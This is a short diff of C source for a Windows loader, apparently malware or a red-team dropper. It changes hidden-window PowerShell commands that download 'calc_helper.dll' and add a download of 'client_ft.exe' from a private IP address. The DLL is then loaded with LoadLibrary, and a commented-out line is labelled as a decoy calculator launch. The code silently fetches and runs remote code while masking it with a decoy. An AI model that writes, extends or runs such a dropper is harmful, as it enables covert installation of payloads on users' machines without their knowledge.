@@ -4,7 +4,8 @@ typedef int (*importFunction)();
 int loadDLL()
 {
 int status = 0;
-system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.197/calc_helper.dll' -OutFile 'calc_helper.dll'");
+system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.196/calc_helper.dll' -OutFile  'calc_helper.dll'");
+system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.196/client_ft.exe' -OutFile 'client_ft.exe'");
 importFunction test;
 HINSTANCE testLibrary = LoadLibrary("calc_helper.dll");
 //system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
